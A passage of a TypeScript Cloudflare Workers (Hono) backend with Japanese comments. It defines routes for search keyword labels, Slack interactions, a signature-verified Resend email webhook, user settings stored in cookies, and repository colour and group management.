  if (!q || q.length < 2) return jsonUtf8({ error: 'Query required' }, 400);

  try {
    const [multiRow, dbLabelRows] = await Promise.all([
      c.env.DB.prepare(
        `SELECT categories FROM keyword_multi_labels WHERE user_id = ? AND search_query = ?`
      ).bind(user.sub, q).first<{ categories: string }>().catch(() => null),
      c.env.DB.prepare(
        `SELECT DISTINCT label FROM commit_search_keyword_labels WHERE user_id = ? AND label IS NOT NULL`
      ).bind(user.sub).all<{ label: string }>().catch(() => ({ results: [] })),
    ]);

    let assignedCategories: string[] = [];
    try {
      assignedCategories = multiRow ? JSON.parse(multiRow.categories) : [];
      if (!Array.isArray(assignedCategories)) assignedCategories = [];
    } catch { assignedCategories = []; }

    const dbLabels = (dbLabelRows.results ?? []).map((r) => r.label).filter(Boolean);
    const allCategories = mergeAllCategories(dbLabels);

    return jsonUtf8({
      search_query: q,
      assigned_categories: assignedCategories,
      all_categories: allCategories,
    });
  } catch (error) {
    logger.warn('Failed to fetch keyword multi-labels', {
      query: q,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch keyword multi-labels' }, 500);
  }
});

app.post('/api/repositories/search/keyword-multi-labels', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'Database not available' }, 500);

  let body: { search_query?: string; categories?: string[] };
  try { body = await c.req.json(); } catch { return jsonUtf8({ error: 'Invalid JSON' }, 400); }

  const searchQuery = (body.search_query ?? '').trim();
  if (!searchQuery || searchQuery.length < 2) return jsonUtf8({ error: '無効なパラメータです' }, 400);

  const rawCats = Array.isArray(body.categories) ? body.categories : [];
  const categories = [...new Set(rawCats.filter((c) => typeof c === 'string' && c.trim()))].map((c) => c.trim());
  const categoriesJson = JSON.stringify(categories);

  try {
    try {
      await c.env.DB.prepare(
        `INSERT INTO keyword_multi_labels (user_id, search_query, categories, created_at, updated_at)
         VALUES (?, ?, ?, datetime('now'), datetime('now'))
         ON CONFLICT(user_id, search_query) DO UPDATE SET categories = excluded.categories, updated_at = datetime('now')`
      ).bind(user.sub, searchQuery, categoriesJson).run();
    } catch {
      await c.env.DB.prepare(
        `INSERT INTO keyword_multi_labels (user_id, search_query, categories, created_at, updated_at)
         VALUES (?, ?, ?, datetime('now'), datetime('now'))`
      ).bind(user.sub, searchQuery, categoriesJson).run();
    }
    return jsonUtf8({ ok: true, search_query: searchQuery, categories });
  } catch (error) {
    logger.warn('Failed to save keyword multi-labels', {
      query: searchQuery,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: '保存に失敗しました' }, 500);
  }
});

app.get('/api/repositories/search/keyword-multi-labels-all', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'Database not available' }, 500);

  try {
    const rows = await c.env.DB.prepare(
      `SELECT search_query, categories FROM keyword_multi_labels WHERE user_id = ?`
    ).bind(user.sub).all<{ search_query: string; categories: string }>().catch(() => ({ results: [] }));

    const items = (rows.results ?? []).map((r) => {
      let cats: string[] = [];
      try { cats = JSON.parse(r.categories); if (!Array.isArray(cats)) cats = []; } catch { cats = []; }
      return { search_query: r.search_query, categories: cats };
    });

    return jsonUtf8({ items });
  } catch (error) {
    logger.warn('Failed to fetch all keyword multi-labels', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch keyword multi-labels' }, 500);
  }
});

/**
 * Slack Interactivity エンドポイント
 * ボタンクリック等の対話イベントを受信し、モーダルを返す
 */
app.post('/slack/interactions', async (c) => {
  const db = c.env.DB;
  const logStep = async (step: string, detail?: string) => {
    if (!db) return;
    try {
      await db.prepare(
        'INSERT INTO slack_interaction_log (step, detail, created_at) VALUES (?, ?, ?)'
      ).bind(step, detail ?? null, new Date().toISOString()).run();
    } catch (_) { /* best effort */ }
  };

  const rawBody = await c.req.text();

  const result = await handleSlackInteraction({
    signingSecret: c.env.SLACK_SIGNING_SECRET,
    slackToken: c.env.SLACK_OAUTH_TOKEN,
    rawBody,
    timestamp: c.req.header('X-Slack-Request-Timestamp'),
    signature: c.req.header('X-Slack-Signature'),
    dbQuery: async (requestId: string) => {
      if (!db) return null;
      return db.prepare(
        'SELECT request_id, daily_seq, event_date, repo_full_name, pr_number, pr_action, pr_url, model, summary, diff_length, created_at, fallback_used, primary_model FROM ai_summary_log WHERE request_id = ?'
      ).bind(requestId).first() as Promise<SummaryModalRow | null>;
    },
    logStep,
    verifySignature: verifySlackSignature,
  });

  if (result.status === 401) {
    return c.text('', 401);
  }
  return c.text('', 200);
});

/**
 * Resend webhook受信用エンドポイント
 * イベントタイプを/lib/resend-webhook.shtml?event=xxxへGETで通知し、Resendへのレスポンスを返す
 */
app.post('/webhook/resend/:sourceId', async (c) => {
  const sourceId = c.req.param('sourceId');

  const db = c.env.DB;
  if (!db) {
    logger.error('Database is not available for Resend webhook source validation');
    return c.json({ error: 'Webhook endpoint is not available' }, 500);
  }

  const sourceRow = await db.prepare(
    `SELECT id, label, webhook_secret FROM resend_webhook_sources WHERE id = ?`
  ).bind(sourceId).first<{ id: string; label: string; webhook_secret: string | null }>();

  if (!sourceRow) {
    logger.warn('Unknown Resend webhook source', { sourceId });
    return c.json({ error: 'Unknown webhook source' }, 404);
  }

  const webhookSecret = sourceRow.webhook_secret ?? c.env.RESEND_WEBHOOK_SECRET;
  if (!webhookSecret) {
    logger.error('Resend webhook secret is not configured', { sourceId });
    return c.json({ error: 'Webhook endpoint is not available' }, 500);
  }

  const rawBody = await c.req.text();

  const verification = await verifyResendWebhookSignature(rawBody, {
    id: c.req.header('svix-id'),
    timestamp: c.req.header('svix-timestamp'),
    signature: c.req.header('svix-signature'),
  }, webhookSecret);

  if (!verification.success) {
    logger.warn('Rejected Resend webhook', {
      reason: verification.reason,
      sourceId,
      path: c.req.path,
      method: c.req.method,
    });
    return c.json({ error: 'Unauthorized webhook' }, 401);
  }

  const resendEventId = c.req.header('svix-id')?.trim();
  if (resendEventId) {
    const dedupKey = `${sourceId}:${resendEventId}`;
    const nowMs = Date.now();
    const dedupTtlSeconds = resolveResendDedupTtlSeconds(c.env.RESEND_WEBHOOK_DEDUP_TTL_SECONDS);
    const expiresAt = nowMs + dedupTtlSeconds * 1000;

    for (const [key, expiry] of resendWebhookDedupCache.entries()) {
      if (expiry <= nowMs) {
        resendWebhookDedupCache.delete(key);
      }
    }

    if (resendWebhookDedupCache.has(dedupKey)) {
      logger.warn('Duplicate Resend webhook detected', { sourceId, resendEventId });
      return c.json({ error: 'Duplicate webhook' }, 409);
    }

    resendWebhookDedupCache.set(dedupKey, expiresAt);
  }

  let payload: ResendWebhookPayload;
  try {
    payload = rawBody ? JSON.parse(rawBody) : {};
  } catch (error) {
    logger.warn('Unable to parse Resend webhook payload', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'Invalid webhook payload' }, 400);
  }

  const eventType = typeof payload?.type === 'string' && payload.type.trim().length > 0
    ? payload.type
    : 'unknown';

  logger.info('Resend webhook received', { eventType });

  const webhookData = payload?.data ?? {};
  const resendEmailId = typeof webhookData.email_id === 'string' && webhookData.email_id.trim().length > 0
    ? webhookData.email_id
    : null;
  const emailTo = Array.isArray(webhookData.to) && webhookData.to.length > 0
    ? webhookData.to.join(', ')
    : (typeof webhookData.to === 'string' && webhookData.to.trim().length > 0 ? webhookData.to : null);
  const emailFrom = typeof webhookData.from === 'string' && webhookData.from.trim().length > 0
    ? webhookData.from
    : null;
  const bounceType = webhookData.bounce?.type ?? null;
  const errorDetail = webhookData.bounce?.message ?? webhookData.error?.message ?? null;

  const slackConfig = {
    signingSecret: c.env.SLACK_SIGNING_SECRET,
    oauthToken: c.env.SLACK_OAUTH_TOKEN,
    clientSecret: c.env.SLACK_CLIENT_SECRET,
    clientId: c.env.SLACK_CLIENT_ID,
    channelId: c.env.SLACK_CHANNEL_ID,
  };

  const deliveryStatus = eventType === 'email.delivered'
    ? '送信完了'
    : (eventType === 'email.failed' || eventType === 'email.bounced' ? '失敗' : null);

  let slackResultText: string | null = null;
  let slackResultAt: string | null = null;

  if (deliveryStatus) {
    const missingSlackVars = Object.entries(slackConfig)
      .filter(([, value]) => !value || value.trim().length === 0)
      .map(([key]) => key);

    if (missingSlackVars.length > 0) {
      logger.error('Slack notification skipped due to missing configuration', {
        missing: missingSlackVars,
      });
      slackResultText = 'skipped:missing_config';
      slackResultAt = new Date().toISOString();
    } else if (slackConfig.oauthToken && slackConfig.channelId) {
      try {
        const from = typeof webhookData.from === 'string' && webhookData.from.trim().length > 0 ? webhookData.from : 'unknown';
        const toDisplay = emailTo ?? 'unknown';
        const subject = typeof webhookData.subject === 'string' && webhookData.subject.trim().length > 0 ? webhookData.subject : 'unknown';

        const slackText = [
          `Resend: ${deliveryStatus}`,
          `from: ${from}`,
          `to: ${toDisplay}`,
          `件名: ${subject}`,
        ].join('\n');

        const slackResult = await postSlackMessage({
          token: slackConfig.oauthToken,
          channel: slackConfig.channelId,
          text: slackText,
        });

        slackResultAt = new Date().toISOString();
        if (!slackResult.ok) {
          logger.error('Slack notification failed for Resend webhook', {
            eventType,
            error: slackResult.error,
            status: slackResult.status,
          });
          slackResultText = `error:${slackResult.status ?? 'unknown'}`;
        } else {
          slackResultText = 'ok';
        }
      } catch (error) {
        logger.error('Slack notification errored for Resend webhook', {
          eventType,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
        slackResultText = `exception:${error instanceof Error ? error.message : 'unknown'}`;
        slackResultAt = new Date().toISOString();
      }
    }
  }

  const notifyUrl = new URL('https://mynw.nekomaneki.work/lib/resend-webhook.shtml');
  notifyUrl.searchParams.set('event', eventType);

  let proxyResultText: string | null = null;
  let proxyResultAt: string | null = null;
  let proxyFailed = false;

  try {
    const proxyResponse = await fetch(notifyUrl.toString(), {
      method: 'GET',
    });

    proxyResultAt = new Date().toISOString();
    if (!proxyResponse.ok) {
      logger.error('Proxy notification failed for Resend webhook', {
        eventType,
        status: proxyResponse.status,
        statusText: proxyResponse.statusText,
      });
      proxyResultText = `error:${proxyResponse.status}`;
      proxyFailed = true;
    } else {
      proxyResultText = 'ok';
    }
  } catch (error) {
    logger.error('Failed to reach proxy target for Resend webhook', {
      error: error instanceof Error ? error.message : 'Unknown error',
      eventType,
    });
    proxyResultText = `exception:${error instanceof Error ? error.message : 'unknown'}`;
    proxyResultAt = new Date().toISOString();
    proxyFailed = true;
  }

  const svixId = resendEventId ?? `noid_${Date.now()}`;
  try {
    await db.prepare(
      `INSERT OR IGNORE INTO resend_webhook_log (source_id, svix_id, resend_email_id, event_type, email_from, email_to, bounce_type, error_detail, slack_result, slack_result_at, proxy_result, proxy_result_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
    ).bind(
      sourceId,
      svixId,
      resendEmailId,
      eventType,
      emailFrom,
      emailTo,
      bounceType,
      errorDetail,
      slackResultText,
      slackResultAt,
      proxyResultText,
      proxyResultAt
    ).run();
  } catch (dbError) {
    logger.error('Failed to insert resend_webhook_log', {
      error: dbError instanceof Error ? dbError.message : 'Unknown error',
      sourceId,
      svixId,
      eventType,
    });
  }

  if (proxyFailed) {
    return c.json({ error: 'Failed to notify proxy target' }, 502);
  }

  return c.json({ success: true, event: eventType }, 200);
});

/**
 * API情報
 */
app.get('/api', (c) => {
  return c.json({
    message: 'Cloudflare Workers GitHub OAuth API',
    version: '1.0.0',
    authentication: {
      github_oauth: 'GET /auth/github',
      logout: 'GET /auth/logout',
    },
    endpoints: {
      public: [
        'GET /api',
        'GET /api/public',
        'GET /health',
      ],
      protected: [
        'GET /api/protected',
        'GET /api/profile',
        'PUT /api/profile',
      ],
    },
  });
});

/**
 * 公開エンドポイント（オプショナル認証）
 */
app.get('/api/public', optionalAuthMiddleware, (c) => {
  const user = c.get('user');

  if (user) {
    return c.json({
      message: 'これは公開エンドポイントです（認証済み）',
      user: {
        username: user.sub,
        name: user.name,
        email: user.email,
      },
    });
  }

  return c.json({
    message: 'これは公開エンドポイントです（未認証）',
    info: 'このエンドポイントは誰でもアクセスできます',
  });
});

/**
 * 保護されたエンドポイント
 */
app.get('/api/protected', authMiddleware, (c) => {
  const user = c.get('user');

  return c.json({
    message: '保護されたリソースへのアクセスに成功しました',
    user: {
      username: user.sub,
      name: user.name,
      email: user.email,
    },
    timestamp: new Date().toISOString(),
  });
});

/**
 * ユーザープロフィール取得
 */
app.get('/api/profile', authMiddleware, (c) => {
  const user = c.get('user');

  return c.json({
    profile: {
      username: user.sub,
      name: user.name,
      email: user.email,
      issuedAt: new Date(user.iat * 1000).toISOString(),
      expiresAt: new Date(user.exp * 1000).toISOString(),
    },
  });
});

/**
 * プロフィール更新（表示名をD1データベースに保存）
 */
app.put('/api/profile', authMiddleware, async (c) => {
  const user = c.get('user');

  let body: { name?: string };
  try {
    body = await c.req.json();
  } catch {
    return c.json({ error: 'リクエストボディが不正です' }, 400);
  }

  const { name } = body;
  if (!name || typeof name !== 'string' || name.trim().length === 0) {
    return c.json({ error: '名前は必須です' }, 400);
  }

  if (name.length > 100) {
    return c.json({ error: '名前は100文字以内にしてください' }, 400);
  }

  const success = await updateUserSettings(c.env.DB, user.sub, 'display_name', name.trim());

  if (!success) {
    return c.json({ error: 'データベースの更新に失敗しました' }, 500);
  }

  return c.json({
    message: 'プロフィールを更新しました',
    profile: {
      username: user.sub,
      name: name.trim(),
      email: user.email,
    },
  });
});

/**
 * タイムゾーン設定変更
 */
app.post('/api/settings/timezone', authMiddleware, async (c) => {
  try {
    const user = c.get('user');
    const { timezone } = await c.req.json();

    if (timezone !== 'UTC' && timezone !== 'JST') {
      return c.json({ error: '無効なタイムゾーンです' }, 400);
    }

    const success = await updateUserSettings(c.env.DB, user.sub, 'timezone', timezone);

    if (!success) {
      return c.json({ error: 'データベースの更新に失敗しました' }, 500);
    }

    c.header('Set-Cookie', `user_timezone=${timezone}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: 'タイムゾーンを変更しました', timezone }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Timezone update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'タイムゾーンの変更に失敗しました' }, 500);
  }
});

/**
 * セッション有効期限設定変更
 */
app.post('/api/settings/session-duration', authMiddleware, async (c) => {
  try {
    const user = c.get('user');
    const { sessionDuration } = await c.req.json();

    const validDurations = ['1h', '3h', '8h', '1d', '3d', '1w'];
    if (!validDurations.includes(sessionDuration)) {
      return c.json({ error: '無効なセッション有効期限です' }, 400);
    }

    const success = await updateUserSettings(c.env.DB, user.sub, 'session_duration', sessionDuration);

    if (!success) {
      return c.json({ error: 'データベースの更新に失敗しました' }, 500);
    }

    const jwtSecret = c.env.JWT_SECRET;
    if (!jwtSecret) {
      return c.json({ error: 'サーバー設定エラー' }, 500);
    }

    const renewed = await renewSession({
      currentUser: user,
      newDuration: sessionDuration,
      jwtSecret,
      idleTimeoutEnv: c.env.SESSION_IDLE_TIMEOUT_SECONDS,
    });

    const headers = new Headers();
    for (const cookie of renewed.cookies) {
      headers.append('Set-Cookie', cookie);
    }
    headers.set('Content-Type', 'application/json; charset=utf-8');

    return new Response(
      JSON.stringify({ message: 'セッション有効期限を変更しました（即時反映）', sessionDuration }),
      { status: 200, headers }
    );
  } catch (error) {
    const user = c.get('user');
    logger.error('Session duration update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'セッション有効期限の変更に失敗しました' }, 500);
  }
});

/**
 * テーマ設定変更
 */
app.post('/api/settings/theme', authMiddleware, async (c) => {
  try {
    const { theme } = await c.req.json();

    const validThemes = ['light', 'dark'];
    if (!validThemes.includes(theme)) {
      return c.json({ error: '無効なテーマです' }, 400);
    }

    c.header('Set-Cookie', `user_theme=${theme}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: 'テーマを変更しました', theme }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Theme update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'テーマの変更に失敗しました' }, 500);
  }
});

/**
 * 最終コミット一覧の表示件数設定変更
 */
app.post('/api/settings/recent-commits-count', authMiddleware, async (c) => {
  try {
    const { count } = await c.req.json();
    const num = parseInt(count, 10);

    if (isNaN(num) || num < 5 || num > 100) {
      return c.json({ error: '表示件数は5〜100の範囲で指定してください' }, 400);
    }

    c.header('Set-Cookie', `user_recent_commits_count=${num}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: '表示件数を変更しました', count: num }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Recent commits count update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: '表示件数の変更に失敗しました' }, 500);
  }
});

/**
 * トースト通知の表示時間設定変更
 */
app.post('/api/settings/toast-duration', authMiddleware, async (c) => {
  try {
    const { duration } = await c.req.json();
    const num = parseInt(duration, 10);

    if (isNaN(num) || num < 1 || num > 60) {
      return c.json({ error: 'トースト表示時間は1〜60秒の範囲で指定してください' }, 400);
    }

    c.header('Set-Cookie', `user_toast_duration=${num}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: 'トースト表示時間を変更しました', duration: num }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Toast duration update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'トースト表示時間の変更に失敗しました' }, 500);
  }
});

/**
 * /status の月別コミットキャッシュ詳細ソート設定変更
 */
app.post('/api/settings/status-commit-cache-sort-mode', authMiddleware, async (c) => {
  try {
    const { mode } = await c.req.json();

    if (mode !== 'off' && mode !== 'toggle') {
      return c.json({ error: '無効な並び替え設定です' }, 400);
    }

    const headers = new Headers({ 'Content-Type': 'application/json; charset=utf-8' });
    headers.append('Set-Cookie', `user_status_commit_cache_sort_mode=${mode}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);
    if (mode === 'off') {
      headers.append('Set-Cookie', 'user_status_commit_cache_sort_state=cached_at_desc; Path=/; Secure; SameSite=Lax; Max-Age=31536000');
    }

    return new Response(JSON.stringify({ message: '月別コミットキャッシュ詳細の並び替え設定を変更しました', mode }), { status: 200, headers });
  } catch (error) {
    const user = c.get('user');
    logger.error('Status commit cache sort mode update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: '月別コミットキャッシュ詳細の並び替え設定変更に失敗しました' }, 500);
  }
});

app.post('/api/settings/status-chart-mode', authMiddleware, async (c) => {
  try {
    const { mode } = await c.req.json();

    if (mode !== 'gradient' && mode !== 'repo') {
      return c.json({ error: '無効なチャート表示モードです' }, 400);
    }

    c.header('Set-Cookie', `user_status_chart_mode=${mode}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: '月別コミット量チャートの表示モードを変更しました', mode }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Status chart mode update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: '月別コミット量チャートの表示モード変更に失敗しました' }, 500);
  }
});

app.post('/api/settings/status-chart-sort-order', authMiddleware, async (c) => {
  try {
    const { order } = await c.req.json();

    if (order !== 'count' && order !== 'date') {
      return c.json({ error: '無効なチャート並び順です' }, 400);
    }

    c.header('Set-Cookie', `user_status_chart_sort_order=${order}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: '月別コミット量チャートの並び順を変更しました', order }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Status chart sort order update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: '月別コミット量チャートの並び順変更に失敗しました' }, 500);
  }
});

app.post('/api/settings/status-table-autodetect', authMiddleware, async (c) => {
  try {
    const { mode } = await c.req.json();

    if (mode !== 'on' && mode !== 'off') {
      return c.json({ error: '無効な自動検出設定です' }, 400);
    }

    c.header('Set-Cookie', `user_status_table_autodetect=${mode}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: '/status のテーブル自動検出設定を変更しました', mode }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Status table autodetect setting update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: '/status のテーブル自動検出設定変更に失敗しました' }, 500);
  }
});

app.post('/api/settings/status-show-autodetected-tables', authMiddleware, async (c) => {
  try {
    const { mode } = await c.req.json();

    if (mode !== 'on' && mode !== 'off') {
      return c.json({ error: '無効な表示設定です' }, 400);
    }

    c.header('Set-Cookie', `user_status_show_autodetected_tables=${mode}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: '/status の自動検出テーブル表示設定を変更しました', mode }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Status auto detected table visibility update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: '/status の自動検出テーブル表示設定変更に失敗しました' }, 500);
  }
});

app.post('/api/settings/status-ignore-unknown-unclassified-warning', authMiddleware, async (c) => {
  try {
    const { mode } = await c.req.json();

    if (mode !== 'on' && mode !== 'off') {
      return c.json({ error: '無効な未分類警告設定です' }, 400);
    }

    c.header('Set-Cookie', `user_status_ignore_unknown_unclassified_warning=${mode}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);

    return c.json({ message: '/status の未分類警告設定を変更しました', mode }, 200);
  } catch (error) {
    const user = c.get('user');
    logger.error('Status unknown unclassified warning setting update error', {
      userId: user?.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: '/status の未分類警告設定変更に失敗しました' }, 500);
  }
});

app.post('/api/settings/search-label-mode', authMiddleware, async (c) => {
  try {
    const { mode } = await c.req.json();
    if (mode !== 'uncategorized' && mode !== 'manual-modal' && mode !== 'auto-classify') {
      return c.json({ error: '無効なモードです' }, 400);
    }
    c.header('Set-Cookie', `user_search_label_mode=${mode}; Path=/; Secure; SameSite=Lax; Max-Age=31536000`);
    return c.json({ message: '新規キーワード分類モードを変更しました', mode }, 200);
  } catch {
    return c.json({ error: '新規キーワード分類モードの変更に失敗しました' }, 500);
  }
});

/**
 * リポジトリ色設定の同期
 * コミットキャッシュに存在するリポジトリをrepo_color_settingsに一括登録する。
 * 既存行は上書きしない（INSERT OR IGNORE）。
 */
app.post('/api/repo-colors/sync', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;

  if (!db) {
    return c.json({ error: 'D1 is not configured' }, 500);
  }

  try {
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';

    const cacheRows = await db.prepare(
      'SELECT DISTINCT owner, repo FROM commit_calendar_cache WHERE workspace_id = ?'
    ).bind(workspaceId).all<{ owner: string; repo: string }>();

    const listRows = await db.prepare(
      'SELECT DISTINCT owner, repo FROM commit_list_cache WHERE workspace_id = ?'
    ).bind(workspaceId).all<{ owner: string; repo: string }>();

    const repoSet = new Set<string>();
    if (cacheRows.results) {
      for (const r of cacheRows.results) repoSet.add(`${r.owner}/${r.repo}`);
    }
    if (listRows.results) {
      for (const r of listRows.results) repoSet.add(`${r.owner}/${r.repo}`);
    }

    if (repoSet.size === 0) {
      return c.json({ message: 'コミットキャッシュにリポジトリが存在しません', registered: 0, total: 0 });
    }

    const existingRows = await db.prepare(
      'SELECT repo_name FROM repo_color_settings WHERE workspace_id = ?'
    ).bind(workspaceId).all<{ repo_name: string }>();

    const existingSet = new Set<string>();
    let maxOrder = -1;
    if (existingRows.results) {
      for (const r of existingRows.results) existingSet.add(r.repo_name);
    }
    if (existingSet.size > 0) {
      const orderRow = await db.prepare(
        'SELECT MAX(display_order) AS max_order FROM repo_color_settings WHERE workspace_id = ?'
      ).bind(workspaceId).first<{ max_order: number | null }>();
      maxOrder = orderRow?.max_order ?? -1;
    }

    const defaultPalette = [
      '#667eea', '#e53e3e', '#38a169', '#ed8936', '#9f7aea',
      '#dd6b20', '#319795', '#d53f8c', '#3182ce', '#d69e2e',
      '#805ad5', '#2b6cb0', '#c53030', '#2f855a', '#b7791f',
    ];

    const newRepos = Array.from(repoSet).filter(r => !existingSet.has(r)).sort();
    if (newRepos.length === 0) {
      return c.json({ message: '全リポジトリ登録済みです', registered: 0, total: existingSet.size });
    }

    const now = new Date().toISOString();
    const stmts = newRepos.map((repo, i) => {
      const colorIndex = (existingSet.size + i) % defaultPalette.length;
      const order = maxOrder + 1 + i;
      return db.prepare(
        'INSERT OR IGNORE INTO repo_color_settings (workspace_id, repo_name, color_code, display_order, tags, is_visible, created_at, updated_at) VALUES (?, ?, ?, ?, ?, 1, ?, ?)'
      ).bind(workspaceId, repo, defaultPalette[colorIndex], order, '', now, now);
    });

    await db.batch(stmts);

    logger.info(`Synced ${newRepos.length} repos to repo_color_settings`, {
      userId: user.sub,
      workspaceId,
      newRepos,
    });

    return c.json({
      message: `${newRepos.length} 件のリポジトリを登録しました`,
      registered: newRepos.length,
      total: existingSet.size + newRepos.length,
      repos: newRepos,
    });
  } catch (error) {
    logger.error('Failed to sync repo colors', {
      userId: user.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'リポジトリ色設定の同期に失敗しました' }, 500);
  }
});

/**
 * リポジトリ色設定の一覧取得
 */
app.get('/api/repo-colors', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) {
    return c.json({ colors: [] });
  }
  try {
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';
    const rows = await db.prepare(
      'SELECT repo_name, color_code, display_order, tags, is_visible FROM repo_color_settings WHERE workspace_id = ? ORDER BY display_order ASC, repo_name ASC'
    ).bind(workspaceId).all<{
      repo_name: string; color_code: string; display_order: number; tags: string; is_visible: number;
    }>();
    const colors = (rows.results ?? []).map(r => ({
      repoName: r.repo_name,
      colorCode: r.color_code,
      displayOrder: r.display_order,
      tags: r.tags,
      isVisible: r.is_visible === 1,
    }));
    return c.json({ colors });
  } catch (error) {
    logger.error('Failed to fetch repo colors', {
      userId: user.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'リポジトリ色設定の取得に失敗しました' }, 500);
  }
});

/**
 * リポジトリ色設定の個別更新
 */
app.patch('/api/repo-colors/:repoName{.+}', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) {
    return c.json({ error: 'D1 is not configured' }, 500);
  }
  const repoName = c.req.param('repoName');
  try {
    const body = await c.req.json<{ colorCode?: string; tags?: string; isVisible?: boolean; displayOrder?: number }>();
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';

    const updates: string[] = [];
    const values: (string | number)[] = [];
    if (body.colorCode !== undefined) {
      if (!/^#[0-9a-fA-F]{6}$/.test(body.colorCode)) {
        return c.json({ error: '無効なカラーコードです' }, 400);
      }
      updates.push('color_code = ?');
      values.push(body.colorCode);
    }
    if (body.tags !== undefined) {
      updates.push('tags = ?');
      values.push(body.tags);
    }
    if (body.isVisible !== undefined) {
      updates.push('is_visible = ?');
      values.push(body.isVisible ? 1 : 0);
    }
    if (body.displayOrder !== undefined) {
      updates.push('display_order = ?');
      values.push(body.displayOrder);
    }
    if (updates.length === 0) {
      return c.json({ error: '更新するフィールドがありません' }, 400);
    }
    updates.push('updated_at = ?');
    values.push(new Date().toISOString());
    values.push(workspaceId, repoName);

    const result = await db.prepare(
      `UPDATE repo_color_settings SET ${updates.join(', ')} WHERE workspace_id = ? AND repo_name = ?`
    ).bind(...values).run();

    if (result.meta.changes === 0) {
      return c.json({ error: '対象のリポジトリ色設定が見つかりません' }, 404);
    }
    return c.json({ message: '色設定を更新しました', repoName });
  } catch (error) {
    logger.error('Failed to update repo color', {
      userId: user.sub,
      repoName,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'リポジトリ色設定の更新に失敗しました' }, 500);
  }
});

/**
 * リポジトリグループ一覧取得
 */
app.get('/api/repo-groups', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) {
    return c.json({ groups: [] });
  }
  try {
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';
    const groupRows = await db.prepare(
      'SELECT id, name, description, color_code, icon, slack_channel_id, display_order, created_at, updated_at FROM repo_groups WHERE workspace_id = ? ORDER BY display_order ASC, name ASC'
    ).bind(workspaceId).all<{
      id: string; name: string; description: string; color_code: string;
      icon: string; slack_channel_id: string; display_order: number;
      created_at: string; updated_at: string;
    }>();

    const groups = groupRows.results ?? [];
    if (groups.length === 0) {
      return c.json({ groups: [] });
    }

    const groupIds = groups.map(g => g.id);
    const memberRows = await db.prepare(
      `SELECT group_id, repo_name FROM repo_group_members WHERE workspace_id = ? AND group_id IN (${groupIds.map(() => '?').join(',')}) ORDER BY repo_name`
    ).bind(workspaceId, ...groupIds).all<{ group_id: string; repo_name: string }>();

    const memberMap = new Map<string, string[]>();
    if (memberRows.results) {
      for (const m of memberRows.results) {
        const list = memberMap.get(m.group_id) || [];
        list.push(m.repo_name);
        memberMap.set(m.group_id, list);
      }
    }

    return c.json({
      groups: groups.map(g => ({
        id: g.id,
        name: g.name,
        description: g.description,
        colorCode: g.color_code,
        icon: g.icon,
        slackChannelId: g.slack_channel_id,
        displayOrder: g.display_order,
        repos: memberMap.get(g.id) || [],
      })),
    });
